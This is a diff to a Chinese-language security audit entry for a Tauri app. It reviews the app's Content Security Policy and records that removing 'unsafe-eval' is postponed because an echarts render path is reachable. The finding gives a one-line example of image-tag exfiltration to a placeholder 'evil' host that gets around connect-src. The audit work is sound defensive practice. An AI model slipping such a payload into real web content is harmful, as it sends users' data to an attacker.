@@ -93,7 +93,7 @@
 
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
 - **建议:** 排查 Vditor/KaTeX/Mermaid 对 eval 的真实依赖逐项灰度摘除；保留并测试锚定 `connect-src 'self'`。
-- **预研（2026-08-29,只读探查）:** vendored 库逐一扫 `new Function`/`eval(`:Vditor 主库、KaTeX、Mermaid 均 **0 处**;仅 echarts 1 处 + markmap(d3-dsv autoType)1 处。echarts 的 `new Function` 是 `JSON.parse` 不存在时的死分支(WebView 必有 JSON,静态证实不可达);markmap 的属 d3 `autoType` 行构造(执行源为库内置字段名模板,非用户输入)。**摘除 `unsafe-eval` 风险面比预期小**——潜在破坏点集中在 markmap 渲染路径,可灰度试验:`tauri.conf.json` 摘 `unsafe-eval` 后跑 mermaid/markmap/e2e 富媒体矩阵 + 真机抽验。`img-src http: https:` 仍等产品口径。
+- **试验结论（2026-08-30,PR #163）:** 预研低估一处——echarts 的 `new Function` **不是死分支**:xlsx 依赖链上有裸 `Function("'use strict';return (…)")`,且 echarts 经 `.language-echarts` → `V.chartRender` 显式接线,渲染路径真实可达,摘除会击穿 echarts 图表。Vditor 主库/KaTeX/Mermaid 零 eval 的结论仍成立。**决定:暂缓摘除**,恢复原 CSP;契约测试锚定现行状态;摘除前置(替换 echarts xlsx 解析或锁定其内联序列化路径)另行立卡。`img-src http: https:` 仍等产品口径。
 
 #### ✅ ISS-203 TypeScript strict 迁移（已 PR #155,2026-08-29 squash merge e7258f2,详见 [DEC-142](DECISIONS.md)）
 
